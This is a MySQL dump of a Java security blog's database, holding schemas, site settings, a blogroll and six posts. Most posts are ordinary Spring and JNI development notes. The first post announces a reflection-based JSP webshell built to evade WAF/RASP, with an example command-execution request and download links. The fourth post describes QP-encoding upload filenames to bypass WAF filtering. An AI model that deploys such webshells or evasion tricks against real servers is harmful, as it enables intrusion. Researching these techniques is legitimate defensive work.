/*
 Navicat Premium Data Transfer

 Source Server         : localhost_3306
 Source Server Type    : MySQL
 Source Server Version : 50730
 Source Host           : localhost:3306
 Source Schema         : javaweb-blog

 Target Server Type    : MySQL
 Target Server Version : 50730
 File Encoding         : 65001

 Date: 16/09/2020 18:44:22
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for sys_comments
-- ----------------------------
DROP TABLE IF EXISTS `sys_comments`;
CREATE TABLE `sys_comments` (
  `comment_id` int(9) unsigned NOT NULL AUTO_INCREMENT COMMENT '评论Id',
  `comment_post_id` int(9) unsigned NOT NULL DEFAULT '0' COMMENT '评论的文章Id',
  `comment_user_id` int(9) unsigned NOT NULL DEFAULT '0' COMMENT '评论的用户Id(未登录的用户Id为0)',
  `comment_author` varchar(16) NOT NULL COMMENT '评论者名称',
  `comment_author_email` varchar(100) DEFAULT '' COMMENT '评论者邮箱',
  `comment_author_url` varchar(200) DEFAULT '' COMMENT '评论者个人主页',
  `comment_author_ip` varchar(100) DEFAULT '' COMMENT '评论者IP地址',
  `comment_content` text NOT NULL COMMENT '评论内容',
  `comment_status` smallint(1) NOT NULL DEFAULT '0' COMMENT '评论状态(0:待审核,1:审核通过,2:审核不通过)',
  `comment_user_agent` varchar(255) NOT NULL DEFAULT '' COMMENT '用户的UserAgent',
  `comment_date` datetime NOT NULL COMMENT '评论发布时间',
  `comment_parent_id` int(9) unsigned NOT NULL DEFAULT '0' COMMENT '评论父级Id',
  `comment_approved` tinyint(1) DEFAULT NULL,
  PRIMARY KEY (`comment_id`),
  KEY `comment_post_ID` (`comment_post_id`),
  KEY `comment_approved_date_gmt` (`comment_status`),
  KEY `comment_parent` (`comment_parent_id`),
  KEY `comment_author_email` (`comment_author_email`(10))
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Table structure for sys_config
-- ----------------------------
DROP TABLE IF EXISTS `sys_config`;
CREATE TABLE `sys_config` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `config_key` varchar(255) NOT NULL COMMENT '键',
  `config_value` text COMMENT '值',
  PRIMARY KEY (`id`),
  UNIQUE KEY `config_key` (`config_key`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8 COMMENT='系统配置表';

-- ----------------------------
-- Records of sys_config
-- ----------------------------
BEGIN;
INSERT INTO `sys_config` VALUES (1, 'sys_website_name', 'PHP & Java');
INSERT INTO `sys_config` VALUES (2, 'sys_base_url', 'http://p2j.cn/');
INSERT INTO `sys_config` VALUES (3, 'sys_index_page', 'index.php');
INSERT INTO `sys_config` VALUES (4, 'sys_aliases_name', 'XXX');
INSERT INTO `sys_config` VALUES (6, 'sys_website_description', '{写什么PHP/Python? 转Java多好!}');
INSERT INTO `sys_config` VALUES (7, 'sys_version', 'JavaWeb Blog 1.1.2');
INSERT INTO `sys_config` VALUES (8, 'sys_admin_email', 'admin@javaweb.org');
INSERT INTO `sys_config` VALUES (9, 'sys_icp_num', '京B2-20090059-1');
INSERT INTO `sys_config` VALUES (10, 'sys_traffic_statistics_code', '<!-- baidu统计 -->\r\n<script>\r\n    var _hmt = _hmt || [];\r\n    (function() {\r\n        var hm = document.createElement(\"script\");\r\n        hm.src = \"https://hm.baidu.com/hm.js?f4c571d9b889bfb3b4f18e87a6dbe619\";\r\n        var s = document.getElementsByTagName(\"script\")[0];\r\n        s.parentNode.insertBefore(hm, s);\r\n    })();\r\n</script>');
COMMIT;

-- ----------------------------
-- Table structure for sys_links
-- ----------------------------
DROP TABLE IF EXISTS `sys_links`;
CREATE TABLE `sys_links` (
  `link_id` int(9) unsigned NOT NULL AUTO_INCREMENT COMMENT '链接Id',
  `link_url` varchar(255) NOT NULL COMMENT '链接地址',
  `link_name` varchar(255) NOT NULL COMMENT '链接名称',
  `link_image_url` varchar(255) DEFAULT NULL COMMENT '链接图片',
  `link_description` varchar(255) DEFAULT NULL COMMENT '链接描述',
  `create_time` datetime DEFAULT NULL COMMENT '注册时间',
  PRIMARY KEY (`link_id`)
) ENGINE=MyISAM AUTO_INCREMENT=158 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of sys_links
-- ----------------------------
BEGIN;
INSERT INTO `sys_links` VALUES (10, 'http://www.iswin.org/', '随风&#039;blog', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (9, 'http://www.0day5.com/', '0day5', NULL, NULL, '2015-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (12, 'http://0cx.cc/', 'しovの枫☆☆', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (13, 'http://www.shack2.org/', 'Shack2&#039;blog', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (8, 'http://zsy.ca/blog/', '小胖子&#039;blog', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (19, 'http://wutongyu.info', '梧桐雨软件园', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (20, 'http://blog.80host.com', '80主机', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (21, 'http://www.03sec.com/', 'sky&#039;自留地', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (22, 'http://www.leesec.com', 'Leesec&#039;s blog', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (24, 'http://www.hack1990.com/', 'iick&#039;s blog', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (27, 'http://imlonghao.com/', 'imlonghao', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (60, 'http://bluereader.org/', '深蓝阅读', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (51, 'http://sealin.net/', 'SeaLin', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (35, 'http://phpinfo.me/', 'Sunshie&#039;blog', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (44, 'http://nmap.cc', '御龙', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (45, 'http://www.metasploit.cn/', 'Metasploit', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (72, 'http://www.nxadmin.com', '阿德马Web安全', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (57, 'http://navisec.it/', 'navisec导航', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (7, 'http://www.jeary.org', 'jeary\'blog', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (69, 'http://www.metasploit.cn/', 'Metasploit', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (74, 'http://ver007.org/', 'ver007', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (76, 'http://wolvez.club/', 'lostwolf\'s blog', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (155, 'http://absec.cn/', 'AbSec', NULL, NULL, '2019-03-11 13:35:05');
INSERT INTO `sys_links` VALUES (79, 'http://www.52bug.cn', '吾爱漏洞', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (80, 'http://www.hksafe.cn.com', 'T0reAd&#039;s blog', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (81, 'http://lucaos.net', 'lucao&#039;s blog', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (82, 'http://www.thinkings.org/', 'Tr3jer_CongRong', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (84, 'http://littlehann.cnblogs.com/', '长路', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (85, 'http://xia0yu.win/', '宇宙黑客-小屿', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (87, 'http://www.xmanblog.net/', 'Xman\'s blog', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (145, 'https://woj.app', '蜗居', NULL, NULL, '2017-02-14 12:06:09');
INSERT INTO `sys_links` VALUES (91, 'http://www.cnbraid.com', 'Braid\'s Blog', NULL, NULL, '2016-12-21 10:17:53');
INSERT INTO `sys_links` VALUES (156, 'https://www.cnblogs.com/H4ck3R-XiX/', 'H4ck3R', NULL, NULL, '2020-03-29 14:22:05');
INSERT INTO `sys_links` VALUES (146, 'http://wooyaa.me/', 'wooyaa\'s Blog', NULL, NULL, '2017-06-21 15:16:35');
INSERT INTO `sys_links` VALUES (147, 'https://xllx.org/', 'Null\'s Blog', NULL, NULL, '2017-07-02 14:48:18');
INSERT INTO `sys_links` VALUES (148, 'http://lianzhang.org/', '连长', NULL, NULL, '2017-07-02 14:48:48');
INSERT INTO `sys_links` VALUES (149, 'http://91xx.org/', 'Rocky\'s Blog', NULL, NULL, '2017-07-02 14:49:25');
INSERT INTO `sys_links` VALUES (150, 'http://py4.me/blog/', 'RedFree\'s Blog', NULL, NULL, '2017-07-02 14:49:42');
INSERT INTO `sys_links` VALUES (154, 'http://xssav.com/', 'xssav', NULL, NULL, '2018-04-11 14:05:47');
INSERT INTO `sys_links` VALUES (157, 'https://su18.org/', '银河系黑客-素十八', NULL, NULL, '2010-05-13 18:36:06');
COMMIT;

-- ----------------------------
-- Table structure for sys_posts
-- ----------------------------
DROP TABLE IF EXISTS `sys_posts`;
CREATE TABLE `sys_posts` (
  `post_id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '文章ID',
  `user_id` int(9) NOT NULL COMMENT '用户ID',
  `category_id` int(11) NOT NULL DEFAULT '-1',
  `post_title` varchar(100) NOT NULL COMMENT '标题',
  `post_author` varchar(16) NOT NULL COMMENT '作者',
  `post_content` longtext NOT NULL COMMENT '文章内容',
  `post_password` varchar(32) DEFAULT NULL COMMENT '访问密码',
  `publish_date` datetime NOT NULL COMMENT '发布时间',
  `publish_status` smallint(1) NOT NULL DEFAULT '1' COMMENT '发布状态(1:已发布,2:草稿),默认值:1',
  `post_clicks` int(11) unsigned zerofill NOT NULL DEFAULT '00000000000' COMMENT '点击数',
  `tags` varchar(255) DEFAULT NULL COMMENT '标签',
  `comment_count` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '评论数量',
  `last_modified_time` datetime NOT NULL COMMENT '最后修改时间',
  PRIMARY KEY (`post_id`),
  KEY `index_title` (`post_title`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8 COMMENT='文档表';

-- ----------------------------
-- Records of sys_posts
-- ----------------------------
BEGIN;
INSERT INTO `sys_posts` VALUES (1, 1, 12, '一个绕Runtime、ProcessBuilder的linux-cmd.jsp', '园长', '<p>\r\n	最近有人问怎么绕过ProcessBuilder的exec方法,所以就写了一个可以绕大部分WAF或者说RASP的jsp。原理很简单:直接反射java.lang.UNIXProcess类。\r\n</p>\r\n<p>\r\n	请求:<a href=\"http://localhost:8080/linux-cmd.jsp?str=ls -la\" target=\"_blank\">http://localhost:8080/linux-cmd.jsp?str=ls -la</a> \r\n</p>\r\n<p>\r\n	Windows版懒得写，会的朋友自己动手稍微改下就可以了。\r\n</p>\r\n<p>\r\n	下载地址:<a class=\"ke-insertfile\" href=\"/uploads/file/20180508/20180508075245_212.zip\" target=\"_blank\">linux-cmd.jsp.zip</a> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	再发一个纯Java反射ProcessBuilder类的cmd.jspx,下载地址:<a href=\"http://javaweb.org/uploads/file/20180502/20180502014842_62.zip\" target=\"_blank\">cmd.jspx</a>\r\n</p>', NULL, '2018-05-08 07:57:18', 1, 00000000000, '', 0, '2018-05-08 07:57:18');
INSERT INTO `sys_posts` VALUES (2, 1, 28, 'Mac IDEA+CLION jni Hello World', '园长', '<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n<p>\r\n	新建一个空的javaweb-jni项目，并在IDEA添加拓展工具:\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20180523/20180523075652_579.png\" alt=\"\" width=\"600\" height=\"404\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n添加拓展工具:\r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n</p>\r\n<div>\r\n	Program: $JDKPath$/bin/javah\r\n</div>\r\n<div>\r\n	Arguments: -jni -classpath $OutputPath$ -d ./jni/ $FileClass$\r\n</div>\r\n<div>\r\n	Working directory: $ProjectFileDir$&nbsp;\r\n</div>\r\n<img src=\"/uploads/image/20180523/20180523075802_689.png\" alt=\"\" width=\"600\" height=\"405\" title=\"\" align=\"\" /> \r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	新建<strong>org.javaweb.jni.Test.java</strong>:\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">package org.javaweb.jni;\r\n\r\npublic class Test {\r\n\r\n   static {\r\n        System.loadLibrary(\"test\");\r\n   }\r\n\r\n   private static native String exec(String cmd);\r\n\r\n   public static void main(String[] args) {\r\n        System.out.println(exec(\"123\"));\r\n   }\r\n\r\n}</pre>\r\n<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n生成JNI头文件测试:\r\n<p>\r\n	<img src=\"/uploads/image/20180523/20180523075948_992.png\" alt=\"\" width=\"600\" height=\"371\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n成功生成的头文件会存放在当前项目根目录下创建jni目录:\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20180523/20180523080022_278.png\" alt=\"\" width=\"340\" height=\"238\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\nClion新建C项目:\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20180523/20180523080055_220.png\" alt=\"\" width=\"600\" height=\"372\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n</p>\r\n<div>\r\n	复制jni.h和jni_md.h到Clion项目目录(jdk1.8.0_144.jdk换成本地的JDK版本):\r\n</div>\r\n<div>\r\n	<br />\r\n</div>\r\n<div>\r\n	cd /Library/Java/JavaVirtualMachines/jdk1.8.0_144.jdk/Contents/Home/\r\n</div>\r\n<div>\r\n	cp include/jni.h include/darwin/jni_md.h /Users/yz/CLionProjects/javaweb-jni\r\n</div>\r\n<div>\r\n	<br />\r\n</div>\r\n<div>\r\n	复制idea中的<strong>org_javaweb_jni_Test.h</strong>到Clion目录修改<strong>#include &lt;jni.h&gt;</strong>为<strong>#include \"jni.h\"</strong> \r\n</div>\r\n<img src=\"/uploads/image/20180523/20180523080129_329.png\" alt=\"\" width=\"600\" height=\"326\" title=\"\" align=\"\" /> \r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n新建<strong>org_javaweb_jni_Test.c</strong>并编译lib库:\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20180523/20180523080224_125.png\" alt=\"\" width=\"600\" height=\"346\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n</p>\r\n<div>\r\n	编译test库,库名称必须是“<strong>lib***.jnilib</strong>”。\r\n</div>\r\n<div>\r\n	gcc org_javaweb_jni_Test.c -shared -fPIC -o libtest.jnilib\r\n</div>\r\n<div>\r\n	<br />\r\n</div>\r\n<div>\r\n	复制编译后的test库到java动态链接库:\r\n</div>\r\n<div>\r\n	cp libtest.jnilib /Users/yz/Library/Java/Extensions/\r\n</div>\r\n<div>\r\n	<br />\r\n</div>\r\n<div>\r\n	通过System.getProperty(\"java.library.path\")可以获取链接库目录,也可以<a href=\"https://blog.csdn.net/quqibing001/article/details/51201768\">自行设置java.library.path的路径</a>。\r\n</div>\r\n<div>\r\n	<br />\r\n</div>\r\n<div>\r\n	最后执行<strong>Test.java</strong>：&nbsp;\r\n</div>\r\n<img src=\"/uploads/image/20180523/20180523080339_212.png\" alt=\"\" width=\"600\" height=\"394\" title=\"\" align=\"\" /> \r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	注意:JDK10移除了javah,需要改为javac加参数。例如:javac -h -cp jna.jar com/sun/jna/Function.java\r\n</p>\r\n<p>\r\n	参考:\r\n</p>\r\n<div>\r\n	<a href=\"https://blog.csdn.net/huachao1001/article/details/53906237\">https://blog.csdn.net/huachao1001/article/details/53906237</a> \r\n</div>\r\n<p>\r\n	<br />\r\n</p>', NULL, '2018-05-23 08:09:31', 1, 00000000000, '', 0, '2018-05-23 08:09:31');
INSERT INTO `sys_posts` VALUES (3, 1, 33, 'Spring Boot 2.x JPA 不能够添加自定义Repository', '园长', '<p>\r\n	升级Spring Boot版本后出现了大量的问题，升级到新版的Spring data JPA 会报错:\r\n</p>\r\n<p>\r\n<pre class=\"brush: java; gutter: true\">org.springframework.beans.factory.BeanCreationException: Error creating bean with name \'sysPostAPI\': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name \'sysPostServiceImpl\': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name \'sysPostRepositoryImpl\': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name \'sysPostRepository\': Cannot create inner bean \'(inner bean)#9af3bdd\' of type [org.springframework.data.repository.core.support.RepositoryFragmentsFactoryBean] while setting bean property \'repositoryFragments\'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name \'(inner bean)#9af3bdd\': Invocation of init method failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name \'sysPostRepositoryCustomImplFragment\': Cannot resolve reference to bean \'sysPostRepositoryCustomImpl\' while setting constructor argument; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name \'sysPostRepositoryCustomImpl\': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name \'sysPostRepository\': FactoryBean threw exception on object creation; nested exception is java.lang.NullPointerException</pre>\r\n</p>\r\n<p>\r\n	解决办法是需要在自定义的仓库类上，添加<span>@NoRepositoryBean注解</span>:\r\n</p>\r\n<p>\r\n<pre class=\"brush: java; gutter: true\">@NoRepositoryBean\r\npublic interface SysPostRepositoryCustom {\r\n......\r\n\r\n}</pre>\r\n</p>\r\n<p>\r\n	问题详情参考:\r\n</p>\r\n<p>\r\n	https://stackoverflow.com/questions/44831103/spring-boot-jpa-unable-to-add-custom-repository/\r\n</p>\r\n<p>\r\n	https://jira.spring.io/browse/DATACMNS-1147\r\n</p>\r\n<p>\r\n	<br />\r\n</p>', NULL, '2018-06-14 07:24:21', 1, 00000000002, '', 0, '2018-06-14 07:24:21');
INSERT INTO `sys_posts` VALUES (4, 1, 11, 'Spring MVC MultipartResolver特性-QP编码', '园长', '<p>\r\n	今天看Spring的Multipart处理发现一段比较奇怪的代码：\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20180803/20180803094501_282.png\" alt=\"\" width=\"800\" height=\"358\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	奇怪的是Spring为什么会对“=?”、“?=”进行特殊处理？跟进后发现这玩意是QP编码，用来解决邮件内附件编码问题。Spring调用了java mail的api对文件上传的附件文件名称进行了QP编码。\r\n</p>\r\n<p>\r\n	既然已知Spring的这个特性，那么某些时候或许就可以通过对文件名称进行编码来绕过传统的waf、cdn的防御了。\r\n</p>\r\n<p>\r\n	利用Java mail库生成<span>特殊的</span>文件名：\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20180803/20180803095634_331.png\" alt=\"\" width=\"500\" height=\"371\" title=\"\" align=\"\" />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	上传进行编码后的文件：\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20180803/20180803095001_3.png\" alt=\"\" width=\"500\" height=\"145\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	Spring会做decode解析：\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20180803/20180803094605_47.png\" alt=\"\" width=\"800\" height=\"389\" title=\"\" align=\"\" /> \r\n</p>', NULL, '2018-08-03 09:47:51', 1, 00000000002, '', 0, '2018-08-03 09:47:51');
INSERT INTO `sys_posts` VALUES (5, 1, 11, '修改Spring Data Elasticsearch 对象序列化方式', '园长', '<p>\r\n	Spring Data Elasticsearch默认采用了Jackson作为对象序列化方式,但是为了保持Json序列化一致性就不得不修改Spring Data Elasticsearch的序列化结果了，这里讲下如何使用的是Fastjson来序列化Spring Data Elasticsearch查询出来的数据。\r\n</p>\r\n<p>\r\n	Spring Data Elasticsearch中，默认会调用org.springframework.data.elasticsearch.core.DefaultResultMapper来映射ElasticSearch返回的结果，而最终序列化方法在<span>DefaultResultMapper的父类org.springframework.data.elasticsearch.core.AbstractResultMapper的publicT mapEntity(String source, Classclazz)方法，所以只需要想办法重写<span>mapEntity方法就行了</span></span>。\r\n</p>\r\n<p>\r\n	在Spring Boot项目中定义下自定义的ElasticsearchTemplate就可以实现自定义<span>ResultMapper了</span>:\r\n</p>\r\n<p>\r\n<pre class=\"brush: java; gutter: true\">@Bean(\"elasticsearchTemplate\")\r\npublic ElasticsearchTemplate elasticsearchTemplate(Client client) {\r\n	SimpleElasticsearchMappingContext mappingContext = new SimpleElasticsearchMappingContext();\r\n	return new ElasticsearchTemplate(\r\n			client,\r\n			new MappingElasticsearchConverter(mappingContext),\r\n			new DefaultResultMapper() {\r\n				public &lt;T&gt; T mapEntity(String source, Class&lt;T&gt; clazz) {\r\n					return JSON.parseObject(source, clazz);\r\n				}\r\n			}\r\n	);\r\n}</pre>\r\n</p>\r\n重启服务即可。\r\n<p>\r\n	<br />\r\n</p>', NULL, '2018-10-17 08:48:45', 1, 00000000000, '', 0, '2018-10-17 08:48:45');
INSERT INTO `sys_posts` VALUES (6, 1, 11, 'Spring MVC 5.X Debug', '园长', '<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n<p>\r\n	web.xml初始化\r\n</p>\r\n<p>\r\n	<img src=\"/uploads/image/20181026/20181026071155_87.png\" alt=\"\" width=\"638\" height=\"451\" title=\"\" align=\"\" />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n	<div>\r\n		&nbsp; &nbsp; &nbsp; &nbsp; web.xml需要配置Spring的listener(ContextLoaderListener)，ContextLoaderListener是Spring的初始化加载类，如果未在web.xml中配置“<span style=\"font-size:14px;font-family:-apple-system, &quot;\">context-param</span>”，默认会优先加载“/WEB-INF/”下加载applicationContext.xml。\r\n	</div>\r\n	<div>\r\n		<br />\r\n	</div>\r\n	<div>\r\n		<span>&nbsp;&nbsp; &nbsp;SpringMVC实现方式是Servlet，通过在web.xml配置DispatcherServlet,所有的请求都会先经过Spring处理。</span>\r\n	</div>\r\n	<div>\r\n		<br />\r\n	</div>\r\n	<div>\r\n		<span>&nbsp;&nbsp; &nbsp;Spring MVC是一个架构上非常复杂的框架，经过抽象后的DispatcherServlet就会显得比较复杂了。但是从根本上来说DispatcherServlet就是一个普通的Servlet，所以它处理Http请求的方式就必然是重写Servlet的doXXX或service方法。</span>\r\n	</div>\r\n	<p>\r\n		<img src=\"/uploads/image/20181026/20181026071238_827.png\" alt=\"\" width=\"610\" height=\"326\" title=\"\" align=\"\" />\r\n	</p>\r\n	<p>\r\n		<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->&nbsp; &nbsp; &nbsp;从类图可以看到，FrameworkServlet类是DispatcherServlet第一个父类，这个类也是重写了所有的Http请求方法(七种Http请求方式)，以及Servlet提供的service方法:\r\n	</p>\r\n	<p>\r\n		<img src=\"/uploads/image/20181026/20181026071327_961.png\" alt=\"\" width=\"668\" height=\"265\" title=\"\" align=\"\" />\r\n	</p>\r\n	<p>\r\n		<br />\r\n	</p>\r\n	<p>\r\n		<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n&nbsp; &nbsp; 在Servlet中，所有的请求方法都会先经过service方法，然后才会进入具体的doXXXX方法。\r\n	</p>\r\n	<p>\r\n		<img src=\"/uploads/image/20181026/20181026071400_485.png\" alt=\"\" width=\"542\" height=\"212\" title=\"\" align=\"\" />\r\n	</p>\r\n	<p>\r\n		<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n不过Spring MVC中并没有直接在service方法中处理请求的，而是在具体的请求方法，比如doPost方法：\r\n	</p>\r\n	<p>\r\n		<img src=\"/uploads/image/20181026/20181026071456_120.png\" alt=\"\" width=\"682\" height=\"483\" title=\"\" align=\"\" />\r\n	</p>\r\n	<p>\r\n		<br />\r\n	</p>\r\n	<p>\r\n		<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n		<div>\r\n			从上图可以看到，所有的doXXX方法都会进入processRequest方法。而processRequest方法会直接回调DispatcherServlet类的doService方法。\r\n		</div>\r\n		<div>\r\n			doService经过初始化后会调用doDispatch方法来完成MVC的请求分发。Spring 5支持请求异步处理，这里暂且跳过相关分析。\r\n		</div>\r\n		<div>\r\n			<br />\r\n		</div>\r\n		<div>\r\n			doDispatch方法是整个MVC处理的核心，大致逻辑如下：\r\n		</div>\r\n		<div>\r\n			<br />\r\n		</div>\r\n		<ol>\r\n			<li>\r\n				<div>\r\n					checkMultipart 检测是否是Multipart请求(文件上传请求)，如果是Multipart请求需要解析表单域内容并封装成一个包含了文件信息和表单内容的特殊的request对象(StandardMultipartHttpServletRequest)。StandardMultipartHttpServletRequest类实现了MultipartHttpServletRequest接口，并继承了HttpServletRequestWrapper类(这个类是用于包装HttpRequest请求对象的，如果想修改request的方法类需要继承此类并重写对应的方法)，StandardMultipartHttpServletRequest类内部还实现了对文件上传的请求解析(parseRequest方法)、对request对象进行包装(主要重写了getParameterMap、getParameterNames方法不然无法从request中获取表单域中的参数值)。\r\n				</div>\r\n			</li>\r\n			<li>\r\n				查找请求处理器mappedHandler,getHandler(processedRequest);这个方法是获取当前request的处理器的，往深了跟会发现handler是有很多类型的(RequestMappingHandlerMapping、BeanNameUrlHandlerMapping、DelegatingHandlerMapping、EmptyHandlerMapping)，保存在handlerMappings对象中的。跟进到AbstractHandlerMapping类的getHandler方法能看到获取handler的内部细节，其中调用类getHandlerInternal方法，这个方法内部调用了AbstractHandlerMethodMapping类的lookupHandlerMethod方法来查找请求URL地址对应的handler。通过addMatchingMappings处理后matches对象就会记录url地址和对应的具体的handler，用于后面的handler调用。其实Spring MVC的所有mapping的配置信息都是保存在了mappingRegistry对象中。如果一个url地址找到了多个handler，那么Spring MVC会从中挑选一个最佳匹配(bestMatch)的handler来处理请求。\r\n			</li>\r\n			<li>\r\n				getHandlerAdapter方法会从上面找到的handler中找到一个合适的适配器类型，handlerAdapters分为RepositoryRestHandlerAdapter、RequestMappingHandlerAdapter、HttpRequestHandlerAdapter、SimpleControllerHandlerAdapter。\r\n			</li>\r\n			<li>\r\n				处理Http请求中的last-modified(只支持GET、Head请求)。\r\n			</li>\r\n			<li>\r\n				调用mappedHandler,处理Spring的拦截器(applyPreHandle方法),这里会加载用户自定义的拦截器(优先)以及内置的拦截器并调用其preHandle方法，根据拦截器的处理结果(true,false)来决定mvc请求是否继续执行，这也是为什么在拦截器preHandle方法中一定要返回正确的值，因为如果返回false程序是不会进任何的Controller方法执行就会结束掉http请求的。\r\n			</li>\r\n			<li>\r\n				根据getHandlerAdapter找到的适配器结果处理mvc请求，比如找到的适配器类型是RequestMappingHandlerAdapter，那么就会调用RequestMapping的handler处理逻辑去处理handler。具体的处理逻辑在RequestMappingHandlerAdapter类的handleInternal方法调用的invokeHandlerMethod、ServletInvocableHandlerMethod类的invokeAndHandle方法，处理完成后返回ModelAndView。Spring Controller的方法参数值是在AbstractMessageConverterMethodArgumentResolver类的readWithMessageConverters方法处理的，Spring默认有8种参数转换器(在messageConverters变量中定义的:ByteArrayHttpMessageConverter、StringHttpMessageConverter、ResourceHttpMessageConverter、ResourceRegionHttpMessageConverter、SourceHttpMessageConverter、AllEncompassingFormHttpMessageConverter、Jaxb2RootElementHttpMessageConverter、MappingJackson2HttpMessageConverter)用于参数值自动映射。顺便解答下为什么json只能映射一个参数？因为Spring根本就不考虑多参数的json映射这类情况，AbstractJackson2HttpMessageConverter类的readJavaType方法中直接调用了Jackson的json序列化，而参数就是request的InputStream，所以这个in被Jackson读取了就无法再次渲染了。\r\n			</li>\r\n			<li>\r\n				如果handler处理结果返回的ModelAndView中未包含view，设置applyDefaultViewName。\r\n			</li>\r\n			<li>\r\n				依次调用拦截器的postHandle方法。\r\n			</li>\r\n			<li>\r\n				处理handler执行结果，processDispatchResult，如果有ModelAndView就渲染view、调用拦截器的afterCompletion方法。\r\n			</li>\r\n			<li>\r\n				结束doDispatch逻辑，请求处理完成。\r\n			</li>\r\n		</ol>\r\n	</p>\r\n</p>', NULL, '2018-10-26 07:15:29', 1, 00000000000, '', 0, '2018-10-26 07:15:29');
